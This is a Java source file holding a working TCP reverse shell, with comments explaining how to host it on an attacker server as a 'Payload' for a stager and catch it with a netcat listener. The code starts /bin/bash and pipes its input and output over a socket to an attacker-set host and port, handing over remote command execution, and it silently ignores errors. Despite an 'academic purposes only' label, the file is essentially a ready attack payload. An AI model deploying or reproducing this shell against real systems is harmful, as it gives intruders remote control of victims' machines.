import java.net.Socket;
import java.io.InputStream;
import java.io.OutputStream;

/**
 * For academic purposes only.
 *
 * This reverse shell is based pretty much on this gist:
 *
 *   https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76
 *
 * 1) Save a copy of this file to your attacker server.
 * 2) Replace "class TCPReverseShell" with "class Payload"
 * 3) Rename the file to "Payload.java"
 * 4) Alter the attacker to your hostname/ip
 * 5) set the port to match your "nc -lvp <port>"
 * 6) Start an HTTP server
 *
 * You can use Apache, Nginx or python as per this blog:
 *
 *   https://cornerpirate.com/2016/12/16/simple-http-or-https-servers/
 *
 * The reason for renaming the class is because it would baffle Stager to
 * have a class called Payload living inside it. That would be ambiguous.
 *
 * @author cornerpirate
 */
public class TCPReverseShell {

    /**
     * This method is called when the payload is compiled and executed. I am
     * showing a reverse shell here for Windows.
     */
    public static void Run() {

        try {

            // IP address or hostname of attacker
            String attacker = "SETME";
            int port = 8044;
            // For a windows target do this. For linux "/bin/bash"
            String cmd = "/bin/bash";
            // The rest creates a new process
            // Establishes a socket to the attacker
            // Then redirects the stdin, stdout and stderr to the port.
            Process p = new ProcessBuilder(cmd).redirectErrorStream(true).start();
            Socket s = new Socket(attacker, port);
            InputStream pi = p.getInputStream(), pe = p.getErrorStream(), si = s.getInputStream();
            OutputStream po = p.getOutputStream(), so = s.getOutputStream();
            // read all input and output forever.
            while (!s.isClosed()) {
                while (pi.available() > 0) {
                    so.write(pi.read());
                }
                while (pe.available() > 0) {
                    so.write(pe.read());
                }
                while (si.available() > 0) {
                    po.write(si.read());
                }
                so.flush();
                po.flush();
                Thread.sleep(50);
                try {
                    p.exitValue();
                    break;
                } catch (Exception e) {
                }
            };
            p.destroy();
            s.close();
        } catch (Exception ex) {
            // Ignore errors as we are doing naughty things anyway.
        }

    }
}
